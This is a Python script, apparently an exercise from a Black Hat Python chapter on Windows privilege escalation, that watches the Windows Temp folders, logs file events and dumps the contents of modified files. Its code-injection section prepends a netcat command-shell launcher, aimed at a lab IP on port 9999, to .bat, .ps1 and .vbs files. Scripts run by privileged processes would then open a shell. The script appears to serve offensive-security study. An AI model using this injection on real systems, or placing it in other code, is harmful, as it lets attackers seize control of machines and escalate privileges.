import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIR = 0x0001
# Dir list to monitor
PATHS = ['C:\\WINDOWS\\Temp', tempfile.gettempdir()]

# ⁡⁢⁢⁣Code injection component⁡
# pyintaller -F netcat.py <must be done prior>
NETCAT = 'ch2_BasicNetworkTools\\netcat.exe'
TGT_IP = '192.168.1.208'
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'

FILE_TYPES = { # Code snipets based on file extension
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'behpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n']
}

def inject_code(full_filename, contents, extension): 
    # Handles code injection
    if FILE_TYPES[extension][0].strip() in contents:
        return
    
    # Write marker and code to inject
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')
# ⁡⁢⁢⁣Code injection component⁡

def monitor(path_to_watch):
    h_dir = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIR,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    ) # Monitoring thread for all dirs in watch path
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_dir,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None                
            ) # Call 𝘙𝘦𝘢𝘥𝘋𝘪𝘳𝘦𝘤𝘵𝘰𝘳𝘺𝘊𝘩𝘢𝘯𝘨𝘦𝘴𝘞 
            for action, file_name in results: # Print relevant info
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    try:
                        print('[vvv] Dumpting contents...')
                        with open(full_filename) as f:
                            contents = f.read()
                        print(contents)
                        print('[^^^] Dump complete.')
                    except Exception as e:
                        print(f'[!!!] Dump failed. {e}')
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except Exception:
            pass

if __name__ == '__main__':
    for path in PATHS: 
        # Lauch monitor for all paths in dir list
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()

# 𝗧𝗲𝘀𝘁 - 𝗕𝗲𝗳𝗼𝗿𝗲 𝗰𝗼𝗱𝗲 𝗶𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻:
#
# C:\Users\User>cd C:\Windows\temp
# C:\Windows\Temp>echo hello > fileTest.bat
# C:\Windows\Temp>rename filetest.bat file2test
# C:\Windows\Temp>del file2test
# C:\Windows\Temp>
#
# -------------------- have 𝘧𝘪𝘭𝘦_𝘮𝘰𝘯𝘪𝘵𝘰𝘳 run in another tab -------------------- 
#
# C:\BlackHat_Python\ch10_WindowsPrivilegeEscalation> python file_monitor.py
# [+] Created C:\WINDOWS\Temp\fileTest.bat
# [*] Modified C:\WINDOWS\Temp\fileTest.bat
# [vvv] Dumpting contents...
# hello 
# [>] Renamed from C:\WINDOWS\Temp\fileTest.bat
# [<] Renamed to C:\WINDOWS\Temp\file2test
# [-] Deleted C:\WINDOWS\Temp\file2test